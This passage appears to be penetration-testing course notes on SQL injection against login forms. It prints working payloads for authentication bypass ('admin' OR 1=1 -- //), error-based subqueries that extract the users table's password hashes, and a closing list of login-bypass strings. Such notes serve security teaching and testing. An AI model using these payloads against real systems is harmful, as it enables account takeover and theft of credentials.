Authentication Bypass
In some cases, SQL injection can lead to authentication bypass, which is the first exploitation avenue we'll explore.
By forcing the closing quote on the uname value and adding an OR =1=1 statement followed by a -- comment separator and two forward slashes (//), we can prematurely terminate the SQL statement. 

admin' OR 1=1 -- //
Testing for SQLi Authentication Bypass
    
Since we have appended an OR statement that will always be true, the WHERE clause will return the first user id present in the database, whether or not the user record is present. 
Because no other checks are implemented in the application, we are able to gain administrator privileges by circumventing the authentication logic.    

' or 1=1 in (select @@version) -- //
    Listing 16 - Error-based payload

' OR 1=1 in (SELECT * FROM users) -- //
Attempting to retrieve the Users table

This means that we should only query one column at a time. Let's try to grab only the password column from the users table.

' or 1=1 in (SELECT password FROM users) -- //

This is somewhat helpful, as we managed to retrieve all user password hashes; however, we don't know which user each password hash corresponds to. 
We can solve the issue by adding a WHERE clause specifying which user's password we want to retrieve, in this case admin.

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
Improving our SQLi error-based payload
    
Login Bypass:
Both user and password or specific username and payload as password

' or 1=1 --
' or '1'='1
' or 1=1 --+
user' or 1=1;#
user' or 1=1 LIMIT 1;#
user' or 1=1 LIMIT 0,1;#    
